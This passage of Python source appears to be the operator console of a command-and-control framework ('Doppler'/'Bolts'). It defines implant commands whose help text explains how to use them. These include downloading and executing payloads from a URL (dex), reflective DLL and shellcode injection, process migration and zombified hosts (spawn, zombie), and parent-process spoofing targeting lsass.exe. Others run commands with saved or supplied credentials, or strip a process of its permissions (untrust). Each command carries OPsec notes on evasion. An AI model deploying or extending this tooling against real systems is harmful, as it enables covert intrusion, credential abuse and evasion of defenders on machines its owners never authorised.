        "parent_desktop",
        "parent_elevated",
        "parent_exclude",
        "parent_fallback",
        "parent_include",
        "parent_name",
        "parent_pid",
        "procdump",
        "procname",
        "profile",
        "proxy",
        "ps",
        "pull",
        "pwd",
        "pwsh",
        "refresh",
        "regedit",
        "reload_dll",
        "rev2self",
        "rm",
        "run",
        "runas",
        "screenshot",
        "script",
        "set_hide",
        "shell",
        "shutdown",
        "sleep",
        "spawn",
        "touch",
        "troll",
        "untrust",
        "upload",
        "wallpaper",
        "window",
        "write",
        "zerotrace",
        "zombie",
    ]
    _AUTO_PIPE = '[+] Using runtime Pipe value "{pipe}". Use the "-z/--no-auto" argument to disable this action.'

    def __init__(self, shell):
        self.id = None
        self._user = ""
        self.jobs = None
        self.show = False
        self._domain = ""
        self.filter = None
        self.shell = shell
        self._password = ""

    def do_ls(self, p):
        """
        ls [remote_path]

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on path)

        Retrieves a list of files in the supplied directory path. If no path is
        given, the client will use the current working directory.

        Environment variables are processed on the client.

        Examples:
            ls
            ls C:/
        """
        if len(p) == 0:
            return self._system("ls")
        if p == "-al":
            return self._system("ls")
        if p.startswith("-") and " " in p:
            p = p[p.find(" ") + 1 :]  # Truncate any "ls -al"
        self._system(f"ls {p}")

    def do_cd(self, p):
        """
        cd <remote_path>

        OS:    Any
        OPsec: Safe
        Admin: No

        Instructs the client to change it's current working directory.

        Environment variables are processed on the client.

        Examples:
            cd C:/
            cd C:/Windows
        """
        if len(p) == 0:
            return print("cd <remote_path>")
        self._system(f"cd {p}")

    def do_ps(self, _):
        """
        ps

        OS:    Any
        OPsec: Safe
        Admin: No

        Retrives a list of running processes on the client device.
        """
        self._system("ps")

    def do_rm(self, *a):
        """
        rm [-f|--force] <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Deletes a file at the specified path. The force flag "-f" or "--force"
        may be used to delete recursively or delete non-empty directories.

        Environment variables are processed on the client.

        Examples:
            rm C:/directory
            rm -f C:/my/file/path
        """
        if _is_help(a):
            return self.do_help("rm")
        if len(a) == 0:
            return print("rm [-f|--force] <remote_path>")
        r = _PARSERS[0x0].parse_args(a)
        if not nes(r.path):
            return print("rm [-f|--force] <remote_path>")
        self._exec(self.shell.cirrus.task_delete, path=r.path, force=r.force)
        del r

    def do_job(self, j):
        """
        job <job_id>

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Retrieve the results of a completed Job.

        Examples:
            job 1337
        """
        if len(j) == 0:
            return print("job <job_id>")
        try:
            if self.shell.cirrus.show_result(self.id, int(j), False):
                return
            print(f"[+] Job {j} returned no content.")
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_pwd(self, _):
        """
        pwd

        OS:    Any
        OPsec: Safe
        Admin: No

        Returns the client's current working directory.
        """
        self._system("pwd")

    def do_cat(self, f):
        """
        cat <remote_path>

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on target)

        Display the contents of the file at the specified path.

        Environment variables are processed on the client.

        Examples:
            cat C:/file1.txt
            cat C:/Windows/system.ini
        """
        self.do_download(f, None)

    def do_hup(self, *a):
        """
        hup [-u user] [-d domain] [-p password] <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Executes a command on the client but detaches immediately and returns
        without retriving the exit code or stdout/stderr.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The "$" and "." prefixes are allowed for use with this command.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        Examples:
            hup echo lol
            hup ping 127.0.0.1
            hup -u bob -p Password1 whoami /all
        """
        self._run("hup", True, None, *a)

    def do_run(self, *a):
        """
        run [-x|--detach] [-u user] [-d domain] [-p password] <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Executes a command on the client and will return the PID, exit code and
        any stdout/stderr data once the process completes.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed). This is
        the same as running this command with the "hup" command.

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        Examples:
            run tasklist
            run ping 127.0.0.1
            run -u bob -p Password1 whoami /all
        """
        self._run("run", False, None, *a)

    def do_asm(self, *a):
        """
        asm [-x|--detach] <local_file>

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        Reads the filepath from the local (non-client) filesystem as binary data
        and will run it in memory as assembly.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The owning process of this thread can be controlled by the parent filter,
        which can be updated with the filter commands. By default the owner will
        be the current client process if not set.

        If the file is a compiled DLL, this will convert it to shellcode on the
        server side before being sent to the client.

        Examples:
            asm /home/hackerman/gibson.bin
            asm /tmp/malware.dll
        """
        if _is_help(a):
            return self.do_help("asm")
        if len(a) == 0:
            return print("asm [-x|--detach] <local_file>")
        r = _PARSERS[0x1].parse_args(a)
        if not nes(r.file):
            return print("asm [-x|--detach] <local_file>")
        self._exec(
            self.shell.cirrus.task_assembly,
            file=r.file,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_dex(self, *a):
        """
        dex [-x|--detach] [-a|--agent user-agent] <url>

        OS:    Any (ASM/DLL is Windows only)
        OPsec: Not Safe! (If the target is a binary/DLL), Disk Write
        Admin: No

        Downloads the file at the supplied URL (as the client) and attempt to
        execute it. The "Content-Type" header determines what action is taken,
        and can take the form of many different types, such as an EXE, PowerShell
        or Assembly for example.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        DLL or Binary files make a write to disk!

        The parent of this executable can be controlled by the parent filter,
        which can be updated with the filter commands. By default the parent will
        be the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The "-a" or "--agent" argument may be specified to change the User-Agent
        the client uses to connect to the server. String-var dynamic values are
        supported. If left empty, the default Firefox agent string will be used.

        Examples:
            dex google.com/robots.txt
            dex -a 'GoogleBot v%100d' google.com/file.txt
        """
        if _is_help(a):
            return self.do_help("dex")
        if len(a) == 0:
            return print("dex [-x|--detach] [-a user-agent] <url>")
        r = _PARSERS[0x2].parse_args(a)
        if not nes(r.url):
            return print("dex [-x|--detach] [-a user-agent] <url>")
        self._exec(
            self.shell.cirrus.task_pull_exec,
            url=r.url,
            agent=r.agent,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_jobs(self, _):
        """
        jobs

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Display Jobs in progress or cached completed Jobs.
        """
        self.shell.cirrus.show_jobs(self.id, all=False)

    def do_back(self, _):
        """
        back

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Go back to the Bolts menu.
        """
        self._user = ""
        self._domain = ""
        self._password = ""
        self.shell.set_menu(MENU_BOLTS)

    def do_exit(self, _):
        """
        back

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Go back to the Bolts menu.
        """
        self.do_back(_)

    def do_help(self, n):
        if len(n) == 0 or n == "help":
            return print("help <command>")
        try:
            d = getattr(self, "do_" + n).__doc__
        except AttributeError:
            return print(f'[!] Help text for "{n}" not found.')
        if d is None:
            return print(f'[!] Help text for "{n}" not found.')
        for i in d.strip().split("\n"):
            print(i.lstrip(whitespace))
        del d

    def do_info(self, _):
        """
        info

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Display system and client information, such as PID, PPID, user and OS
        version.
        """
        self.shell.cirrus.show_info(self.id)

    def do_kill(self, n):
        """
        kill <pid | process_name>

        OS:    Any
        OPsec: Safe (Process logging?)
        Admin: Maybe (depends on target)

        Attempts to force kill a process by it's Process ID (PID) or image name.

        Examples:
            kill 1337
            kill explorer.exe
        """
        if len(n) == 0:
            return print("kill <pid|name>")
        p, v = None, None
        try:
            p = int(n)
        except ValueError:
            v, p = n, None
        self._exec(self.shell.cirrus.task_kill, pid=p, proc=v)
        del p, v

    def default(self, c):
        if self.shell.no_default_run:
            return
        self.do_run(c)

    def do_chan(self, v):
        """
        chan [boolean]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Enable/Disable channel mode. If no option is specified, enable channel
        mode (if not already enabled). Can take multiple types of boolean values
        ("true", "T", "t", "yes", "y", "enable", "e", "1").

        Examples:
            chan
            chan true
            chan disable
        """
        if len(v) == 0:
            return self._system("chan")
        self._system(f"chan {str(is_true(v)).lower()}")

    def do_dll(self, *a):
        """
        dll [-x|--detach] [-r|--reflect] <[!]local_file | remote_file>

        OS:    Windows
        OPsec: Not Safe! (If a local file is used without reflection), Disk Write
        Admin: Maybe (depends on target)

        Loads a DLL into memory of a process.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The behavior of this command is affected by the specified path.

        If the path is prefixed with an exclamation point "!", attempts to
        |  read the file locally will occur and will fail if the file is not
        |  found. Otherwise, the file contents will be loaded into memory and
        |  sent to the client.
        |  If the "-r" or "--reflect" argument is used, the server will convert
        |  the DLL to shellcode and run it on the client as assembly, otherwise
        |  the file will be written to a temp folder on disk and loaded directly.

        If the path does NOT start with an exclamation point, the initial
        |  search will happen locally and if the path exists, the above block will
        |  occur instead, otherwise the path will be sent to the client to load
        |  the path directly from disk.
        |  NOTE: The "-r" or "--reflect" argument is ignored in this scenario.

        The owning process of this thread can be controlled by the shell filter,
        which can be updated with the filter commands. By default the owner will
        be the current client process if not set.

        Examples:
            dll !/tmp/implant.dll
            dll -r /tmp/malware.dll
            dll C:/Windows/malware.dll
        """
        if _is_help(a):
            return self.do_help("dll")
        if len(a) == 0:
            return print("dll [-x|--detach] [-r|--reflect] <[!]local_file|remote_file>")
        r = _PARSERS[0x3].parse_args(a)
        if not nes(r.file):
            return print("dll [-x|--detach] [-r|--reflect] <[!]local_file|remote_file>")
        self._exec(
            self.shell.cirrus.task_dll,
            file=r.file,
            reflect=r.reflect,
            raw=None,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_last(self, _):
        """
        last

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Display the last time the client connected.
        """
        try:
            s, t = self.shell.cirrus.session(self.id), datetime.now()
            print(f'Last: {time_str(t, s["last"], True)}')
            del s, t
        except ValueError as err:
            print(f"[!] {err}!")

    def do_pull(self, *a):
        """
        pull [-a|--agent user-agent] <url> <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Downloads the file at the supplied URL (as the client) and save it to
        the specified remote path.

        The "-a" or "--agent" argument may be specified to change the User-Agent
        the client uses to connect to the server. String-var dynamic values are
        supported. If left empty, the default Firefox agent string will be used.

        Examples:
            pull google.com/robots.txt C:/robots.txt
            pull -a 'Chrome/Webkit %90d.%90d.%10d %12d/%30d' example.com/file.txt file.txt
        """
        if _is_help(a):
            return self.do_help("pull")
        if len(a) < 2:
            return print("pull [-a user-agent] <url> <remote_path>")
        r = _PARSERS[0x9].parse_args(a, cat=" ")
        if not nes(r.url) or not nes(r.file):
            return print("pull [-a user-agent] <url> <remote_path>")
        self._exec(self.shell.cirrus.task_pull, url=r.url, dest=r.file, agent=r.agent)

    def do_pwsh(self, *a):
        """
        pwsh [-x|--detach] [-u user] [-d domain] [-p password] [-f|--file] <command>

        OS:    Any
        OPsec: Maybe (depends on command / PowerShell Logging)
        Admin: Maybe (depends on command)

        Executes a command on the client as a PowerShell command will return the
        PID, exit code and any stdout/stderr data once the process completes.

        This handles the location of PowerShell automatically and fails if the
        PowerShell binary cannot be found (both Windows and *nix).

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The dollar sign "$" can be prefixed to a raw command instead to run as
        a PowerShell command instead of using this function.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed). This is
        the same as running this command with the "hup" command.

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        If the "-f" or "--file" argument is specified, the command is parsed as
        a local file path instead. The file is read and will be sent to the shell
        as input to stdin.

        Examples:
            $Write-Host "hello"
            pwsh Get-Host
            pwsh Get-WmiObject -Class Win32_BIOS
            pwsh -u bob@example -p password1 Get-Host
        """
        self._run("pwsh", False, "$", *a)

    def do_sleep(self, v):
        """
        sleep [duration]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Update the sleep value for the client. The duration string by default is
        in seconds, but can be suffixed with a 'm', 'h' or 's' to indicate
        minutes, hours or seconds, respectively.

        If a forward slash "/" is specified, the jitter value may also be updated
        at the same time. (The percent symbol "%" may be included or omitted.

        If no value is specified, this displays the current sleep value.

        Examples:
            sleep
            sleep 5s
            sleep 2m
            sleep 30s/50
            sleep 15s/20
        """
        if len(v) == 0:
            try:
                s = self.shell.cirrus.session(self.id)
                print(f'Sleep is set to: {int(int(s["sleep"])//1000000000)}s')
                del s
            except ValueError as err:
                print(f"[!] {err}!")
            return
        self._system(f"sleep {v}")

    def do_touch(self, p):
        """
        touch <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Creates an empty file at the remote destination, if it does not already
        exist.

        Environment variables are processed on the client.

        Examples:
            touch C:/new-file.txt
        """
        if len(p) == 0:
            return print("touch <remote_path>")
        self._exec(self.shell.cirrus.task_touch, path=p)

    def do_proxy(self, *a):
        """
        proxy [-r|--remove] [-u|--update] <name> <address> <profile>

        OS:    Any
        OPsec: Safe (Network logging?)
        Admin: Maybe (depends on port used)

        View, add or remove client-side proxies.

        When not provided with any arguments, this function will return a list
        of any proxies active on the client.

        To remove a currently active Proxy instance, specify the "-r" argument
        with the Proxy name.

        To add a Proxy, supply a name, bind address and a profile to be used.

        To update a Proxy, specify the "-u" argument along with the name and new
        bind address to be used. The profile may be omitted if it does not need
        to be changed.

        Depending on the build arguments of the client, it may only support a
        single Proxy instance or may not support them at all.

        Examples:
            proxy
            proxy test1 0.0.0.0:8080 tcp-profile1
            proxy -u test1 0.0.0.0:9090
            proxy -r test1
        """
        if _is_help(a):
            return self.do_help("proxy")
        if len(a) == 0:
            try:
                r = self.shell.cirrus.session(self.id)
                if "proxy" not in r or len(r["proxy"]) == 0:
                    return print("No proxy services are running.")
                print(f'{"Name":16}Address\n{"="*40}')
                for i in r["proxy"]:
                    print(f'{i["name"]:16}{i["address"]:20}')
                del r
            except ValueError as err:
                print(f"[!] {err}!")
            return
        r = _PARSERS[0xC].parse_args(a)
        if not nes(r.name):
            return print("proxy [-r|--remove] [-u|--update] <name> <address> <profile>")
        if not r.remove and not nes(r.bind):
            return print("proxy [-r|--remove] [-u|--update] <name> <address> <profile>")
        if not r.update and not r.remove and not nes(r.profile):
            return print("proxy creation requires a profile")
        if r.remove:
            self._exec(self.shell.cirrus.session_proxy_remove, name=r.name)
        elif r.update:
            self._exec(
                self.shell.cirrus.session_proxy_update,
                name=r.name,
                address=r.bind,
                profile=r.profile,
            )
        else:
            self._exec(
                self.shell.cirrus.session_proxy_add,
                name=r.name,
                address=r.bind,
                profile=r.profile,
            )
        del r

    def do_script(self, n):
        """
        script <name>

        OS:    Depends on Script contents
        OPsec: Depends on Script contents
        Admin: Depends on Script contents

        Runs the script with the supplied name. The resulting output from the
        script is depdent on it's settings.

        Examples:
            script script1
            script script_test
        """
        if not _valid_name(n, 1, True):
            return print("script <name>")
        self._exec(self.shell.cirrus.task_script, name=n)

    def do_creds(self, *a):
        """
        creds [-c|--clear] [-d|--domain domain] [[domain\\]user[@domain]] [password]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        View, set or clear the current saved credential set.

        This shell can store credentials to be used for successive calls to "run",
        "dup", "shell", "pwsh" and "zombie". If the credentials are valid, the
        commands will execute as the credentialed user instead.

        If no arguments are specified, this will return the current saved credentials
        (if any). Otherwise this can be used to set the credentials or clear them
        with the "-c" or "--clear" argument.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and set and the domain will be set as the new domain value.

        Any non-set value (except domain) will not be changed. Use an empty value
        for that value to set it to empty.

        (The domain value is ignored on non-Windows clients).

        Examples:
            creds
            creds -c
            creds user
            creds user "" # empty password
            creds user password
            creds domain\\user Password123
            creds -d example.com bob password
        """
        if _is_help(a):
            return self.do_help("creds")
        if len(a) == 0:
            if not nes(self._user):
                return print("No current saved credentials.")
            return print(
                "Saved Credentials:\n"
                f"User:        {self._user}\n"
                f"Pass:        {self._password}\n"
                f"Domain:      {self._domain}"
            )
        r = _PARSERS[0x4].parse_args(a)
        if r.clear:
            self._user, self._domain, self._password = "", "", ""
            del r
            return print("[+] Cleared saved credentials.")
        if not nes(r.user):
            return print("creds [-c|--clear] [-d|--domain domain] [user] [password]")
        if isinstance(r.pw, str):
            self._password = r.pw
        self._user, self._domain = split_user_domain(r.user, r.domain)
        del r
        return print(
            f"Saved Credentials:\nUser:        {self._user}\n"
            f"Pass:        {self._password}\nDomain:      {self._domain}"
        )

    def do_runas(self, *a):
        """
        runas [-x|--detach] [-d|--domain domain] <[domain\\]user[@domain]> <pass> <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Run the command with the supplied user credentials. The command will NOT
        use any stored credentials and will only use the credentials specified.

        If no password is required, use an empty string "" or '' as a placeholder.

        The PID, exit code and any stdout/stderr data will be returned once the
        process completes only IF the "-x" or "--detach" argument is used. Otherwise,
        this will return after launching the process and will NOT gather any output
        or exit code data.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and use and the domain will be used as the new domain value.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set. Depending on the targeted parent,
        this may error with "invalid handle" as the user specified might not have
        permissions to access the parent targeted.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        Examples:
            runas bob Password123 tasklist
            runas alice Password! whoami /all
            runas joe@corp.com password1 .dir
            runas -d example.com bob Password123 netstat -anop tcp
        """
        if _is_help(a):
            return self.do_help("runas")
        if len(a) == 0:
            return print("runas [-x] [-d domain] <user> <pass> <command>")
        r = _PARSERS[0x5].parse_args(a, nones=False, cat=" ")
        if not nes(r.user) or not nes(r.cmd):
            return print("runas [-x] [-d domain] <user> <pass> <command>")
        u, d = split_user_domain(r.user, r.domain)
        self._exec(
            self.shell.cirrus.task_execute,
            cmd=r.cmd,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
            user=u,
            domain=d,
            pw=r.pw,
        )
        del u, d, r

    def do_shell(self, *a):
        """
        shell [-x|--detach] [-u user] [-d domain] [-p password] [-f|--file] <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Executes a command on the client as a shell command will return the
        PID, exit code and any stdout/stderr data once the process completes.

        This handles the location of system shell automatically.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The period symbol "." can be prefixed to a raw command instead to run as
        a shell command instead of using this function.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed). This is
        the same as running this command with the "hup" command.

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        If the "-f" or "--file" argument is specified, the command is parsed as
        a local file path instead. The file is read and will be sent to the shell
        as input to stdin.

        Examples:
            shell pwd
            shell set
            .whoami
            .dir
        """
        self._run("shell", False, ".", *a)

    def do_jitter(self, v):
        """
        jitter [percentage %]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Update the jitter percentage value for the client. The specified value
        can include or omit the percentage sign "%".

        If no value is specified, this displays the current jitter percentage.

        Examples:
            jitter
            jitter 50
            jitter 15
        """
        if len(v) == 0:
            try:
                s = self.shell.cirrus.session(self.id)
                print(f'Jitter is set to: {s["jitter"]}%')
                del s
            except ValueError as err:
                print(f"[!] {err}!")
            return
        self._system(f"jitter {v}")

    def do_mounts(self, _):
        """
        mounts

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Lists all mounted drives and/or shares connected to the client.
        """
        self._system("mounts")

    def do_spawn(self, *a):
        """
        spawn   <pipe> [file]
        |       [-m|--method]     <method>
        |       [-t|--target]     <process_name | pid>
        |       [-n|--profile     <profile>
        |       [-f|--args]       <args>
        |       [-a|--agent]      <user-agent>
        |       [-R|--no-reflect]
        |       [-u|--user]       <[domain\\]user[@domain]>
        |       [-d|--domain]     <domain>
        |       [-p|--password]   <password>
        |       [-z|--no-auto]

        OS:    Any
        OPsec: Not Safe! (If a local file without reflect is used), Disk Write
        Admin: Maybe (depends on method/target)

        Spawn a similar instance of this client using a type of method. The method
        can be specified by the "-m" argument.

        The "pipe" argument is required and specifies what pipe name to use to
        connect to the new instance. (However if the "-P/--pipe" argument was
        specified at runtime or through the "DOPPLER_PIPE" environment variable
        the pipe value will be inferred from there and it may be omitted. This
        action can be disable using thr "-z/--no-auto" argument.) The pipe value
        is most likely compiled into the client.

        If any DLL or ASM files are specified using the Doppler command line, the
        file will be used if no file path is specified. Doppler will perfer the ASM
        payload over DLL, if specified. If no method is specified, it will default
        to ASM or DLL if a file is specified.

        By default, the current profile will be used, but can be changed by
        specifying the name with the "-n" argument.

        If the method is "self", "exec" or "exe" the additional "-u", "-p" and
        "-d" arguments may be used to change the user the process is executed as.
        See the "runas" command for more info.

        The following methods are valid:

        dll
        |  Use the "file" specified as a DLL migration method. This method requires
        |  a target to be specified as the host for the DLL. By default, if the
        |  "-R" or "--no-reflect" arguments are NOT supplied, this will convert
        |  the DLL to assembly before sending it to the client. Otherwise the
        |  DLL file will be written to disk before loading.
        |
        |  If a remote path is used instead, the "-R" and "--no-reflect" arguments
        |  are ignored.

        asm
        |  Use the "file" specified as assembly migrate code. This method requires
        |  a target to be specified as the host for the shellcode. If the "file"
        |  path is a DLL, this will convert the DLL to assembly before sending it
        |  to the client.

        exec|exe
        |  Execute a command as the migrate method. This is the default option
        |  if a method is not specified. If the special value "self" is used, this
        |  will use the current client binary path to execute instead.

        pexec|url
        |  Download a payload and execute it as a migrate method. This works
        |  similar to the "dex" command and follows the same content rules.
        |  This method will be automatically selected if a URL is detected and
        |  no method is specified. To force the usage of this method, use "pexec"
        |  or "url" as the "-m" argument value.
        |
        |  Similar to the "dex" command, the "-a" or "--agent" argument may be
        |  used to change the User-Agent used from the default value. See the
        |  "dex" or "pull" command for more info.
        |
        |  If a target is specified and the downloaded type requires a target, it
        |  will be used, otherwise a random process will be chosen.
        |
        |  If the download type is a command type the parent can be controlled by
        |  the parent filter, which can be updated with the filter commands. By
        |  default the parent will be the current client process if not set.

        zombie
        |  Use the "file" specified as assembly migrate code in a zombified process.
        |  This method requires a command to be used as the host, supplied using the
        |  "-f" argument. The running binary must exist but the arguments may be
        |  random/invalid. If the "file" path is a DLL, this will convert the DLL
        |  to assembly before sending it to the client.
        |
        |  The parent of the zombie process can be controlled by the parent filter,
        |  which can be updated with the filter commands. By default the parent
        |  will be the current client process if not set.

        The arguments for this command are similar to the "migrate" command.

        Examples:
            spawn pipe-me self
            spawn -m exec pipe-me
            spawn -p my_profile -m dll pipe-me ~/implant.dll
            spawn pipe-me http://path.to.shell.code
            spawn -m url pipe-me path.to.shell.code
            spawn -p my_profile -m asm ~/bolt.bin
            spawn -m zombie -f notepad.exe ~/implant.dll
            spawn -m self -u admin -p Password123 derp-me
        """
        if _is_help(a):
            return self.do_help("spawn")
        if len(a) < 1:
            return print('Use "spawn -h" for helptext')
        r = _PARSERS[0x6].parse_args(a)
        if nes(self.shell.pipe) and not r.no_auto:
            if not nes(r.file) and nes(r.pipe):
                r.file = r.pipe
                r.pipe = self.shell.pipe
                print(_MenuBolt._AUTO_PIPE.format(pipe=self.shell.pipe))
            elif not nes(r.pipe):
                r.pipe = self.shell.pipe
                print(_MenuBolt._AUTO_PIPE.format(pipe=self.shell.pipe))
        if not nes(r.pipe):
            return print("[!] spawn: invalid/missing pipe name")
        f = self.filter
        if nes(r.target):
            f = _quick_filter(r.target)
        try:
            m, c = _get_callable("spawn", self.show, r, self.shell.asm, self.shell.dll)
        except (ValueError, OSError) as err:
            return print(f"[!] {err}!")
        self._exec(
            self.shell.cirrus.task_spawn,
            pipe=r.pipe,
            method=m,
            profile=r.profile,
            exec=c,
            filter=f,
        )
        del f, m, c, r

    def do_untrust(self, v):
        """
        untrust [pid | process_name]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        "Untrust" the target. This will strip the process of all it's permissions
        and will set the integrity level to Untrusted. This effectively nuters
        the ability for a process to do anything.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            untrust
            untrust 1337
            untrust taskmgr.exe
        """
        if not nes(v):
            if not do_ask("Are you sure you want to use the parent filter target"):
                return print("[!] Untrust aborted")
        self._system_filter("untrust", v)

    def do_parent(self, *a):
        """
        parent [..optional-args..] [pid | name1,name2,nameX...]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        If no arguments are specied, this will just display the current Parent
        Filter options set.

        The last value may be a PID or a (comma|space) seperated list of process
        names. If the value is a number an nothing else is specified, it will be
        considered a PID, otherwise be evaluated as a name.

        All set operations using this function are APPEND functions and will only
        overrite. Use the "-c" or "--clear" flag to reset the Filter.

        Other Arguments
        | -c                         Clear the Parent Filter, takes priority over
        | --clear                     all other arguments.
        | -p        <pid>            Specify the PID to use for the Parent Filter.
        | --pid     <pid>             Takes priority over all other options.
        | -x        <name1,nameX>    Specify a (comma|space) seperated list of process
        | --exclude <name1,nameX>     names to EXCLUDE from the Filter search process.
        |                            This may be used more than one time in the command.
        | -d                          Enable the search to only ALLOW FOREGROUND or
        | --desktop                   DESKTOP processes to be used. Default is don't
        |                             care. Takes priority over any disable arguments.
        | -D                         Enable the search to only ALLOW BACKGROUND or
        | --no-desktop                SERVICE processes to be used. Default is don't
        |                             care.
        | -a | -e                    Enable the search to only ALLOW ELEVATED processes
        | --admin | --elevated        to be used. Default is don't care. Takes priority
        |                             over any disable arguments.
        | -A | -E                    Enable the search to only ALLOW NON-ELEVATED
        | --no-admin | --no-elevated  processes to be used. Default is don't care.
        | -f                         Enable the Filter to fallback if no suitable
        | --fallback                  processes were found during the first run and
        |                             run again with less restrictive settings.
        | -F                         Disable the Filter's ability to fallback if no
        | --no-fallback               suitable processes were found during the first
        |                             run.

        Examples:
            parent
            parent 1337
            parent -p 1337
            parent svchost.exe
            parent -d -F -D -e lsass.exe
            parent -x notepad.exe,explorer.exe lsass.exe,svchost.exe
            parent -A -d -x winword.exe,notepad.exe -x cmd.exe explorer.exe,chrome.exe
        """
        if _is_help(a):
            return self.do_help("parent")
        if len(a) == 0:
            if self.filter is None:
                return print("[+] Parent Filter:\n   <empty>")
            return print(f"[+] Parent Filter:\n   {self.filter}")
        r = _PARSERS[0x7].parse_args(a)
        if r.clear:
            if self.filter is None or self.filter.is_empty():
                self.filter = None
                print("[+] Parent Filter:\n   <empty>")
                return False
            self.filter = None
            print("[+] Parent Filter:\n   <empty>")
            return True
        c = False
        if self.filter is None:
            c, self.filter = True, Filter()
        if nes(r.include):
            try:
                v = int(r.include, 10)
            except ValueError:
                pass
            else:
                c = c or self.filter.pid != v
                self.filter.pid = v
                if c:
                    print(f"[+] Parent Filter:\n   {self.filter}")
                return c
        if isinstance(r.pid, int):
            if r.pid <= 0:
                c = c or (self.filter.pid is not None or self.filter.pid > 0)
                self.filter.pid = None
            else:
                c = c or self.filter.pid != r.pid
                self.filter.pid = r.pid
        if r.exclude is not None and len(r.exclude) > 0:
            v = _split_list_values(r.exclude)
            c = c or self.filter.exclude != v
            self.filter.exclude = v
            del v
        if r.include is not None and len(r.include) > 0:
            v = _split_list_values(r.include)
            c = c or self.filter.include != v
            self.filter.include = v
            del v
        if not r.no_admin or r.admin is not None:
            v = (r.admin is None and r.no_admin) or (r.admin is True and r.no_admin)
            c = c or self.filter.elevated != v
            self.filter.elevated = v
            del v
        if not r.no_desktop or r.desktop is not None:
            v = (r.desktop is None and r.no_desktop) or (
                r.desktop is True and r.no_desktop
            )
            c = c or self.filter.session != v
            self.filter.session = v
            del v
        if not r.no_fallback or r.fallback is not None:
            v = (r.fallback is None and r.no_fallback) or (
                r.fallback is True and r.no_fallback
            )
            c = c or self.filter.fallback != v
            self.filter.fallback = v
            del v
        del r
        print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_zombie(self, *a):
        """
        zombie [-x|--detach] [-u user] [-d domain] [-p password] <local_file> <fake_args>

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on host target)

